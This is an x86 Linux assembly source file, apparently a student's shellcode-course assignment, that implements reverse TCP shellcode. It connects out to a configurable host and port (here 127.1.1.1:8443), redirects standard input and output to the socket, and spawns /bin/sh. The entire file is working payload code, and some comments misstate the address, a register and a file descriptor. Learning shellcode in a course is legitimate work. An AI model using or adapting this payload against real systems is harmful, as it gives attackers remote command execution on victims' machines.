; SLAE - Assignment 2: Reverse TCP Shellcode
; Author: Jesse Nelson
; Student ID: SLAE - 1087
; Purpose: Create a reverse TCP shell in assembly in which the remote port and remote host can be easily configured

global _start

section .text

_start:

	;
	; create a socket
	; socket(2, 1, 0)
	;
	
	xor eax, eax		; clean eax
	xor ebx, ebx		; clean ebx

	mov al, 0x66		; place 0x66 into eax, socketcall() syscall #
	
	mov bl, 0x1		; place 0x1 into ebx, socket() syscall #
	
	xor edx, edx		; clear edx for IPPROTO = 0, using EDX over ESI to keep register count low

    	push edx            	; 0 from before, IPPROTO = 0
    	push ebx            	; SOCK_STREAM = 1    
    	push byte 0x2       	; PF_INET = 2
  
    	mov ecx, esp		; save pointer in ecx -- points to socket() args  
    	
	int 0x80 

	; need to store sockfd somewhere as eax will be overwritten
	; store sockfd into esi

	xchg esi, eax		; sockfd now stored into esi(0x3)

	;
	; connect
	; connect((3, {sa_family=AF_INET, sin_port=htons(8443), sin_addr=inet_addr("127.0.0.1")}, 16))
	;

	mov al, 0x66		; socketcall() syscall #	
	inc ebx			; increase ebx to 0x2 for AF_INET = 2
	
	push 0x0101017f		; sin_addr = 127.1.1.1 in big endian
	push word 0xfb20	; port = 8443 in network byte order
	push bx			; AF_INET = 2
	
	mov ecx, esp		; save pointer in ecx -- points to struct

	push 0x10 		; sizeof = 16
	push ecx 		; struck sockaddr pointer
	push esi 		; sockfd / 0x3

	mov ecx, esp 		; save pointer in ecx -- points to connect() args
	
	inc ebx			; increase ebx to 0x3 for connect() syscall #

	int 0x80 		; run connect()

	;
	; input, output, and error redirection
	; dup2
	; dup2(5, (0,1,2))
	;

    	xchg ebx, esi	; save the clientfd 
      
    	xor ecx, ecx 	; clear ecx
	
	mov cl, 0x2	; setup counter

duploop:  
    	mov al, 0x3f  	; dup2 syscall #  
    	int 0x80  	; run dup2
    	dec ecx    	; decrement counter
    	jns duploop    	; if SF is not set jump back to the top
      
	;    	
	; execve("/bin//sh", NULL, NULL)
	;
	
	mov al, 0xb   		; execve() syscall #
 
    	push edx   		; Null 
    	push 0x68732f2f  	; "hs//"  
    	push 0x6e69622f  	; "nib/"  
      
    	mov ebx, esp  		; save pointer in ecx -- points to "/bin//sh" arg
  
    	mov ecx, edx  		; put edx(0x0) into ecx for NULL  
       
    	int 0x80		; run execve()
